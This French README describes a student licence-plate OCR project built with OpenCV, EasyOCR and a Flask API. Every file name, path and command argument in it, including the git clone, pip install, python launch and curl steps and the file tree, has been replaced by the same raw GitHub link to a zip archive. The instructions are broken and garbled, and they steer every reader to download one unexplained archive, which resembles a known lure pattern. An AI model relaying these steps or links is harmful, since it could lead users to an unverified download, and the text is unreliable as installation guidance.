
# Projet Groupe 3 : Extraction des informations de la Plaques d’Immatriculation

## Description du Projet

Ce projet a pour but de développer une intelligence artificielle capable de détecter et d’extraire automatiquement le texte des plaques d’immatriculation à partir d’une image. Il repose sur un pipeline combinant :

- **OpenCV** pour le traitement et la détection des zones de plaques,
- **EasyOCR** pour l’extraction du texte,
- **Flask** pour exposer le traitement sous forme d’API REST,
- Une **interface HTML simple et dynamique** permettant d’envoyer une image et d’afficher le texte extrait.

Ce projet est **local, léger et prêt pour la production ou l’extension en web/mobile**.

---

## Fonctionnalités Implémentées

1. **Pipeline OCR robuste**
   - Lecture et prétraitement d’image
   - Détection des bords
   - Isolation de la plaque
   - Lecture du texte via EasyOCR

2. **API Flask opérationnelle**
   - Endpoint : `POST /extract-text`
   - Reçoit une image, renvoie le texte détecté

3. **Interface HTML moderne**
   - Upload d’image
   - Animation de chargement
   - Affichage du texte et de l’image traitée

---

## Installation et Utilisation

### Prérequis

- Python 3.8+
- pip (gestionnaire de paquets Python)

### Étapes

1. **Cloner le dépôt**

```bash
git clone https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip
cd text-extraction-on-license-plates
```

2. **Créer un environnement virtuel (optionnel)**

```bash
python -m venv venv
source venv/bin/activate      # Linux/macOS
venv\Scripts\activate       # Windows
```

3. **Installer les dépendances**

```bash
pip install -r https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip
```

> Assurez-vous d’avoir une connexion internet pour permettre à EasyOCR de télécharger les poids de son modèle.

4. **Lancer l’API Flask**

```bash
python https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip
```

L'API sera disponible à l'adresse : [http://localhost:5000](http://localhost:5000)

5. **Lancer l'interface utilisateur**

Ouvrir simplement le fichier `https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip` dans votre navigateur.

---

## Exemple d’appel API

### Requête avec `curl`

```bash
curl -X POST http://localhost:5000/extract-text \
     -F "https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip"
```

### Réponse attendue

```json
{
  "extracted_text": "CMR LT665CD"
}
```

---

## Pipeline Technique (https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip)

```python
def full_plate_pipeline(image_path):
    image = load_image(image_path)
    preprocessed = preprocess_image(image)
    edged = detect_edges(preprocessed)
    plate = find_plate_contour(edged, image)
    if plate is not None:
        return extract_text_from_plate(plate)
    return "Aucune plaque détectée"
```

Toutes les fonctions appelées sont encapsulées dans `https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip`, issu de la conversion de `https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip`.

---

## Structure des Fichiers

```
text-extraction-on-license-plates/
│
├── https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip                  # Serveur Flask pour traitement de l'image
├── https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip                # Pipeline complète (OpenCV + EasyOCR)
├── https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip             # Notebook d'origine (pour développement/test)
├── data/                   # Dossier contenant les images
├── https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip              # Interface web utilisateur
├── uploads/                # Dossier temporaire pour images uploadées
├── https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip        # Fichier des dépendances
└── https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip               # Documentation du projet
```

---

## https://github.com/Garnel-Diffo/text-extraction-on-license-plates/raw/refs/heads/main/data/text_license_plates_extraction_on_v1.9.zip

```txt
flask==3.1.0
flask-cors==5.0.1
opencv-python==4.5.5.62
easyocr
numpy==1.24.0
matplotlib==3.6.3
werkzeug==3.1.3
```

---

## Prochaines Améliorations

- Décomposer complètement le resultat en region par exemple
- Améliorer les interfaces
- Dockerisation de l'application
- Export vers API REST cloud avec authentification

---

## Contributeurs

- DIFFO KENNE GARNEL  
- GOUFAN A ETON ARMEL
- MBIDA NGUELE LOIC
- NGUI FRANCK STEVE
- TEZEMBON DJOUFO LOIC

---

## Licence

Ce projet est sous licence MIT – voir le fichier [LICENSE](LICENSE) pour plus de détails.

---


